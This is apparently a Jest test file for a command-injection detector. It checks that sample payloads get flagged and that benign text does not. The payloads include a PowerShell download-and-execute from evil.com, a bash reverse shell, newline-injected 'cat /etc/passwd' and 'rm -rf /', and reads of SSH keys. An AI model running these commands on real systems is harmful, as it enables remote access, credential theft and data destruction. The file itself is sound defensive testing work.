const cmdiDetector = require('../src/detectors/cmdi');

describe('CmdI Deep Auditor Tests', () => {
  const detect = (payload) => {
    const signals = cmdiDetector.getSignals();
    return signals.some(s => {
      if (s.pattern) return s.pattern.test(payload);
      if (s.test) return s.test(payload);
      return false;
    });
  };

  test('PowerShell Invoke-Expression', () => {
    expect(detect('Invoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.com")')).toBe(true);
  });

  test('PowerShell iex alias', () => {
    expect(detect('iex "whoami"')).toBe(true);
  });

  test('Windows builtin: type', () => {
    expect(detect('; type C:\\Windows\\win.ini')).toBe(true);
    expect(detect('& type secret.txt')).toBe(true);
  });

  test('Windows builtin: dir', () => {
    expect(detect('| dir C:\\')).toBe(true);
    expect(detect('&& dir')).toBe(true);
  });

  test('Newline injection with dangerous command (LF)', () => {
    expect(detect('input\ncat /etc/passwd')).toBe(true);
  });

  test('Newline injection with dangerous command (CRLF)', () => {
    expect(detect('input\r\nrm -rf /')).toBe(true);
  });

  test('URL-encoded newline injection', () => {
    expect(detect('input%0acat /etc/passwd')).toBe(true);
    expect(detect('input%0D%0Acurl http://evil.com')).toBe(true);
  });

  test('Env variable expansion: $HOME', () => {
    expect(detect('echo $HOME/.ssh/id_rsa')).toBe(true);
  });

  test('Env variable expansion: %USERPROFILE%', () => {
    expect(detect('type %USERPROFILE%\\secrets.txt')).toBe(true);
  });

  test('Env variable expansion: $USER and %USERNAME%', () => {
    expect(detect('echo $USER')).toBe(true);
    expect(detect('echo %USERNAME%')).toBe(true);
  });

  test('Subshell execution bypass', () => {
    expect(detect('$(whoami)')).toBe(true);
  });

  test('Backtick execution', () => {
    expect(detect('`id`')).toBe(true);
  });

  test('Windows cmd execution', () => {
    expect(detect('cmd.exe /c calc.exe')).toBe(true);
  });

  test('PowerShell encoded command', () => {
    expect(detect('powershell.exe -enc ZWNobyBoYWNrZWQ=')).toBe(true);
  });

  test('Reverse shell pattern', () => {
    expect(detect('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')).toBe(true);
  });

  test('Pipe operator commands', () => {
    expect(detect('echo test | ls -la')).toBe(true);
    expect(detect('some input | cat /etc/passwd')).toBe(true);
    expect(detect('ping 8.8.8.8 | whoami')).toBe(true);
    expect(detect('something | id')).toBe(true);
    expect(detect('test |pwd')).toBe(true);
    expect(detect('dir | dir')).toBe(true);
    expect(detect('a | type file.txt')).toBe(true);
  });

  test('Benign table separators (no false positives)', () => {
    expect(detect('Option A | Option B')).toBe(false);
    expect(detect('Name | Age | Location')).toBe(false);
    expect(detect('Hello world')).toBe(false);
    expect(detect('1234567890')).toBe(false);
    expect(detect('This is a normal sentence.')).toBe(false);
    expect(detect('user@example.com')).toBe(false);
    expect(detect('https://example.com?q=search')).toBe(false);
    expect(detect('<div>html content</div>')).toBe(false);
    expect(detect('Robert"); DROP TABLE Users;--')).toBe(false);
    expect(detect('{"key": "value"}')).toBe(false);
  });
});
